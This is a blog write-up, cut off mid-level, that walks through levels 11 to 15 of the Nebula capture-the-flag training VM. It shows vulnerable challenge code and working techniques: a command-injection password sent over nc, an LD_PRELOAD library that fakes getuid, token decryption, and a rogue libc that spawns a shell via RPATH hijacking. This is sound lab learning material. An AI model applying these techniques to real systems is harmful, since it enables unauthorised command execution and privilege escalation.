position is <strong>0</strong>(zero) indexed. I&rsquo;ll have to double check how Metasploit&rsquo;s version
returns the offset to match that.</p>

<p>Not sure how often you need a pattern above 20k characters, but if you do,
let me know and I&rsquo;ll work on it.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/07/02/cracking-nebula-part2/">
        Cracking Nebula Part 2
      </a>
    </h1>

    <span class="post-date">Wed, Jul 2, 2014</span>

    

<p>On <a href="http://www.exploit-exercises.com/">Exploit Exercises</a> you can find a
number of CTF (Capture The Flag) VM images where you can practice your
exploiting, hacking and general computer savviness. I&rsquo;ve been working
my way through the Nebula machine and figured I might as well write
up the process both for other&rsquo;s benefit if they get stuck, and also as
a sort of diary for myself, so I can refer back to any info if I need to.</p>

<p>This continues on from <a href="http://unlogic.co.uk/2014/06/24/cracking-nebula-part1/">part 1</a>.</p>

<h2 id="level-11:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 11</h2>

<blockquote>
<p>The /home/flag11/flag11 binary processes standard input and executes a shell command.</p>

<p>There are two ways of completing this level, you may wish to do both :-)</p>
</blockquote>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>
<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include &lt;fcntl.h&gt;</span>
<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;sys/mman.h&gt;</span>

<span style="color: #75715e">/*</span>
<span style="color: #75715e"> * Return a random, non predictable file, and return the file descriptor for it.</span>
<span style="color: #75715e"> */</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">getrand</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">path)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">tmp;</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">pid;</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">fd;</span>

  <span style="color: #f8f8f2">srandom(time(NULL));</span>

  <span style="color: #f8f8f2">tmp</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getenv(</span><span style="color: #e6db74">&quot;TEMP&quot;</span><span style="color: #f8f8f2">);</span>
  <span style="color: #f8f8f2">pid</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getpid();</span>
  
  <span style="color: #f8f8f2">asprintf(path,</span> <span style="color: #e6db74">&quot;%s/%d.%c%c%c%c%c%c&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">tmp,</span> <span style="color: #f8f8f2">pid,</span> 
    <span style="color: #e6db74">&#39;A&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">26</span><span style="color: #f8f8f2">),</span> <span style="color: #e6db74">&#39;0&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">10</span><span style="color: #f8f8f2">),</span> 
    <span style="color: #e6db74">&#39;a&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">26</span><span style="color: #f8f8f2">),</span> <span style="color: #e6db74">&#39;A&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">26</span><span style="color: #f8f8f2">),</span>
    <span style="color: #e6db74">&#39;0&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">10</span><span style="color: #f8f8f2">),</span> <span style="color: #e6db74">&#39;a&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">26</span><span style="color: #f8f8f2">));</span>

  <span style="color: #f8f8f2">fd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">open(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">path,</span> <span style="color: #f8f8f2">O_CREAT</span><span style="color: #f92672">|</span><span style="color: #f8f8f2">O_RDWR,</span> <span style="color: #ae81ff">0600</span><span style="color: #f8f8f2">);</span>
  <span style="color: #f8f8f2">unlink(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">path);</span>
  <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">fd;</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">void</span> <span style="color: #a6e22e">process</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">buffer,</span> <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">length)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">unsigned</span> <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">key;</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">i;</span>

  <span style="color: #f8f8f2">key</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">length</span> <span style="color: #f92672">&amp;</span> <span style="color: #ae81ff">0xff</span><span style="color: #f8f8f2">;</span>

  <span style="color: #66d9ef">for</span><span style="color: #f8f8f2">(i</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">&lt;</span> <span style="color: #f8f8f2">length;</span> <span style="color: #f8f8f2">i</span><span style="color: #f92672">++</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #f8f8f2">buffer[i]</span> <span style="color: #f92672">^=</span> <span style="color: #f8f8f2">key;</span>
    <span style="color: #f8f8f2">key</span> <span style="color: #f92672">-=</span> <span style="color: #f8f8f2">buffer[i];</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #f8f8f2">system(buffer);</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #75715e">#define CL &quot;Content-Length: &quot;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">line[</span><span style="color: #ae81ff">256</span><span style="color: #f8f8f2">];</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buf[</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">];</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">mem;</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">length;</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">fd;</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">path;</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(fgets(line,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(line),</span> <span style="color: #f8f8f2">stdin)</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">NULL)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #f8f8f2">errx(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;reading from stdin&quot;</span><span style="color: #f8f8f2">);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #f8f8f2">CL,</span> <span style="color: #f8f8f2">strlen(CL))</span> <span style="color: #f92672">!=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #f8f8f2">errx(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;invalid header&quot;</span><span style="color: #f8f8f2">);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #f8f8f2">length</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">atoi(line</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">strlen(CL));</span>
  
  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(length</span> <span style="color: #f92672">&lt;</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buf))</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(fread(buf,</span> <span style="color: #f8f8f2">length,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">stdin)</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">length)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">err(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;fread length&quot;</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">}</span>
    <span style="color: #f8f8f2">process(buf,</span> <span style="color: #f8f8f2">length);</span>
  <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">blue</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">length;</span>
    <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">pink;</span>

    <span style="color: #f8f8f2">fd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getrand(</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">path);</span>

    <span style="color: #66d9ef">while</span><span style="color: #f8f8f2">(blue</span> <span style="color: #f92672">&gt;</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;blue = %d, length = %d, &quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">blue,</span> <span style="color: #f8f8f2">length);</span>

      <span style="color: #f8f8f2">pink</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">fread(buf,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buf),</span> <span style="color: #f8f8f2">stdin);</span>
      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;pink = %d</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">pink);</span>

      <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(pink</span> <span style="color: #f92672">&lt;=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
        <span style="color: #f8f8f2">err(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;fread fail(blue = %d, length = %d)&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">blue,</span> <span style="color: #f8f8f2">length);</span>
      <span style="color: #f8f8f2">}</span>
      <span style="color: #f8f8f2">write(fd,</span> <span style="color: #f8f8f2">buf,</span> <span style="color: #f8f8f2">pink);</span>

      <span style="color: #f8f8f2">blue</span> <span style="color: #f92672">-=</span> <span style="color: #f8f8f2">pink;</span>
    <span style="color: #f8f8f2">}</span>  

    <span style="color: #f8f8f2">mem</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">mmap(NULL,</span> <span style="color: #f8f8f2">length,</span> <span style="color: #f8f8f2">PROT_READ</span><span style="color: #f92672">|</span><span style="color: #f8f8f2">PROT_WRITE,</span> <span style="color: #f8f8f2">MAP_PRIVATE,</span> <span style="color: #f8f8f2">fd,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">);</span>
    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(mem</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">MAP_FAILED)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">err(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;mmap&quot;</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">}</span>
    <span style="color: #f8f8f2">process(mem,</span> <span style="color: #f8f8f2">length);</span>
  <span style="color: #f8f8f2">}</span>

<span style="color: #f8f8f2">}</span>
</pre></div>


<p>I&rsquo;ll be honest with you and admit that I had a lot of trouble with this. I eventually looked up how to do this on other blogs, but still couldn&rsquo;t get it to work. After some searching I believe it&rsquo;s down to the bash version my VM is running. The exploit was possible due to some feature in older versions of bash, but not in the version I have. If you would like to read how to get level 11 you can do so here: <a href="http://www.kroosec.com/2012/11/nebula-level11.html">http://www.kroosec.com/2012/11/nebula-level11.html</a></p>

<h2 id="level-12:eaf9fabfe6e85567a2c1f06adf83e2d8">level 12</h2>

<blockquote>
<p>There is a backdoor process listening on port 50001.</p>
</blockquote>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f8f8f2">local</span> <span style="color: #f8f8f2">socket</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">require(</span><span style="color: #e6db74">&quot;socket&quot;</span><span style="color: #f8f8f2">)</span>
<span style="color: #f8f8f2">local</span> <span style="color: #f8f8f2">server</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">assert(socket.bind(</span><span style="color: #e6db74">&quot;127.0.0.1&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">50001</span><span style="color: #f8f8f2">))</span>

<span style="color: #f8f8f2">function</span> <span style="color: #f8f8f2">hash(password)</span> 
  <span style="color: #f8f8f2">prog</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">io.popen(</span><span style="color: #e6db74">&quot;echo &quot;</span><span style="color: #f8f8f2">..password..</span><span style="color: #e6db74">&quot; | sha1sum&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;r&quot;</span><span style="color: #f8f8f2">)</span>
  <span style="color: #f8f8f2">data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">prog:read(</span><span style="color: #e6db74">&quot;*all&quot;</span><span style="color: #f8f8f2">)</span>
  <span style="color: #f8f8f2">prog:close()</span>

  <span style="color: #f8f8f2">data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">string.sub(data,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">40</span><span style="color: #f8f8f2">)</span>

  <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">data</span>
<span style="color: #f8f8f2">end</span>


<span style="color: #66d9ef">while</span> <span style="color: #ae81ff">1</span> <span style="color: #66d9ef">do</span>
  <span style="color: #f8f8f2">local</span> <span style="color: #f8f8f2">client</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">server:accept()</span>
  <span style="color: #f8f8f2">client:send(</span><span style="color: #e6db74">&quot;Password: &quot;</span><span style="color: #f8f8f2">)</span>
  <span style="color: #f8f8f2">client:settimeout(</span><span style="color: #ae81ff">60</span><span style="color: #f8f8f2">)</span>
  <span style="color: #f8f8f2">local</span> <span style="color: #f8f8f2">line,</span> <span style="color: #f8f8f2">err</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">client:receive()</span>
  <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">not</span> <span style="color: #f8f8f2">err</span> <span style="color: #f8f8f2">then</span>
    <span style="color: #f8f8f2">print(</span><span style="color: #e6db74">&quot;trying &quot;</span> <span style="color: #f8f8f2">..</span> <span style="color: #f8f8f2">line)</span> <span style="color: #f92672">--</span> <span style="color: #f8f8f2">log</span> <span style="color: #f8f8f2">from</span> <span style="color: #f8f8f2">where</span> <span style="color: #f8f8f2">;</span>\
    <span style="color: #f8f8f2">local</span> <span style="color: #f8f8f2">h</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">hash(line)</span>

    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">h</span> <span style="color: #f92672">~=</span> <span style="color: #e6db74">&quot;4754a4f4bd5787accd33de887b9250a0691dd198&quot;</span> <span style="color: #f8f8f2">then</span>
      <span style="color: #f8f8f2">client:send(</span><span style="color: #e6db74">&quot;Better luck next time</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
    <span style="color: #66d9ef">else</span>
      <span style="color: #f8f8f2">client:send(</span><span style="color: #e6db74">&quot;Congrats, your token is 413**CARRIER LOST**</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">)</span>
    <span style="color: #f8f8f2">end</span>

  <span style="color: #f8f8f2">end</span>

  <span style="color: #f8f8f2">client:close()</span>
<span style="color: #f8f8f2">end</span>
</pre></div>


<p>So we need to connect to the localhost on port 50001 and enter the correct password. the password is whatever the hash is in plain text. But even if we get it right you can see that we don&rsquo;t get our token. With a specially crafted password however, we can make use of the <code>io.popen</code> call.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level12@nebula:/home/flag12$ nc localhost 50001
Password: hello &amp;&amp; getflag &gt; /tmp/out
Better luck next time
level12@nebula:/home/flag12$ cat /tmp/out
You have successfully executed getflag on a target account
</pre></div>
</p>

<h2 id="level-13:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 13</h2>

<blockquote>
<p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p>
</blockquote>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>

<span style="color: #75715e">#define FAKEUID 1000</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">c;</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">token[</span><span style="color: #ae81ff">256</span><span style="color: #f8f8f2">];</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(getuid()</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">FAKEUID)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Security failure detected. UID %d started us, we expect %d</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">getuid(),</span> <span style="color: #f8f8f2">FAKEUID);</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;The system administrators will be notified of this violation</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #75715e">// snip, sorry :)</span>

  <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;your token is %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">token);</span>
  
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>

<p>Here we need to fake our UID. Sounds tricky. Actually, we don&rsquo;t fake our UID, we fake the call to <code>getuid</code>. How?
<code>getuid</code> is called from a library, which means we are able to replace it with our own library. Let&rsquo;s take a look at
the function definition of <code>getuid</code></p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">GETUID(2)                  Linux Programmer&#39;s Manual                 GETUID(2)

NAME
       getuid, geteuid - get user identity

SYNOPSIS
       #include &lt;unistd.h&gt;
       #include &lt;sys/types.h&gt;

       uid_t getuid(void);
       uid_t geteuid(void);
</pre></div>
</p>

<p>Ok, so let&rsquo;s write our verison of:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;sys/types.h&gt;</span>

<span style="color: #66d9ef">uid_t</span> <span style="color: #a6e22e">getuid</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span> <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">1000</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">}</span>
</pre></div>
</p>

<p>and compile it as a shared library which we then preload (see <code>man ld.so</code> for more info on this). We need to
copy the <code>flag13</code> binary to our local directory because it needs to be run as the same user level as the
library we are trying to preload.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level13@nebula:/tmp$ gcc -shared -fPIC fake.c -o fetgetuid.so
level13@nebula:/tmp$ cp ~flag13/flag13 .
level13@nebula:/tmp$ <span style="color: #f8f8f2">export LD_PRELOAD</span><span style="color: #f92672">=</span>/tmp/fetgetuid.so
level13@nebula:/tmp$ ./flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
level13@nebula:/tmp$ ssh flag13@localhost
flag13@localhost&#39;s password: b705702b-76a8-42b0-8844-3adabbe5ac58
flag13@nebula:~$ getflag
You have successfully executed getflag on a target account
</pre></div>
</p>

<h2 id="level-14:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 14</h2>

<blockquote>
<p>This program resides in /home/flag14/flag14 . It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)</p>
</blockquote>

<p>The contents of <code>token</code> were encrypted using the <code>flag14</code> binary in <code>~flag14</code>. If you run it you can see how it works. Let&rsquo;s enter something and see if we can work out how it works. I created a file with the contents <code>abcdefghijklmno</code> in <code>/tmp/test</code></p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"> level14@nebula:/home/flag14$ cat /tmp/test | ./flag14 -e
acegikmoqsuwy{}level14@nebula:/home/flag14$
</pre></div>
</p>

<p>So luckily it&rsquo;s fairly straightforward, it offsets each letter by the value of its position in the string. A quick Python script can reverse the process.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">sys</span>

<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">decrypt</span><span style="color: #f8f8f2">(input):</span>
  <span style="color: #f8f8f2">out</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;&#39;</span>
  <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">i,</span> <span style="color: #f8f8f2">c</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">enumerate(input):</span>
    <span style="color: #f8f8f2">dec</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">ord(c)</span> <span style="color: #f92672">-</span> <span style="color: #f8f8f2">i</span>
    <span style="color: #f8f8f2">out</span> <span style="color: #f92672">+=</span> <span style="color: #f8f8f2">chr(dec)</span>

  <span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">out</span>


<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">__name__</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&#39;__main__&#39;</span><span style="color: #f8f8f2">:</span>
  <span style="color: #f8f8f2">input</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span>
  <span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">input</span>
  <span style="color: #f8f8f2">decrypt(input)</span>
</pre></div>
</p>

<p>And now pipe the token into it</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level14@nebula:/home/flag14$ python /tmp/decrypt.py 857:g67?5ABBo:BtDA?tIvLDKL<span style="color: #f92672">{</span>MQPSRQWW.
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
8457c118-887c-4e40-a5a6-33a25353165

level14@nebula:/home/flag14$ ssh flag14@localhost

flag14@localhost&#39;s password: 8457c118-887c-4e40-a5a6-33a25353165

flag14@nebula:~$ getflag
You have successfully executed getflag on a target account
</pre></div>
</p>

<h2 id="level-15:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 15</h2>

<blockquote>
<p>strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.</p>

<p>You may wish to review how to &ldquo;compile a shared library in linux&rdquo; and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.</p>

<p>Clean up after yourself :)</p>
</blockquote>

<p>After running <code>strace</code> we notice this particular bit</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/home/flag15$ strace ./flag15
.
.
open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbfdb8ba4) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
.
.
</pre></div>
</p>

<p>It&rsquo;s trying to load libc.so.6 from a specific location. Why is that? Let&rsquo;s use <code>readelf</code> to take a look</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">evel15@nebula:/home/flag15$ readelf -d ./flag15

Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 0x0000000c (INIT)                       0x80482c0
 .
 .
 .
</pre></div>
</p>

<p>So it&rsquo;s got an <code>RPATH</code> to that location and as luck would have it we have write permissions to it. I guess we can create our own <code>libc.so.6</code> in that directory and use it to execute some code - like get ourselves a flag15 shell. Let&rsquo;s take a look at what symbols we&rsquo;re actually using</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/home/flag15$ objdump -R flag15

flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main
</pre></div>
</p>

<p>So we&rsquo;ve got a choice here between <code>__libc_start_main</code> or <code>__gmon_start</code>. As I am more comfortable with <code>__libc_start_main</code> I&rsquo;m going to go with this.</p>

<p>So let us begin with the code for our library by looking up the <a href="http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html">function declaration</a></p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;linux/unistd.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">__libc_start_main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">main)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">),</span> 
<span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">init)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">fini)</span> 
<span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">rtld_fini)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">void</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">stack_end)</span> <span style="color: #f8f8f2">{</span>
  <span style="color: #f8f8f2">system(</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>

<p>In theory we should get a shell now</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 mylibc.c
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
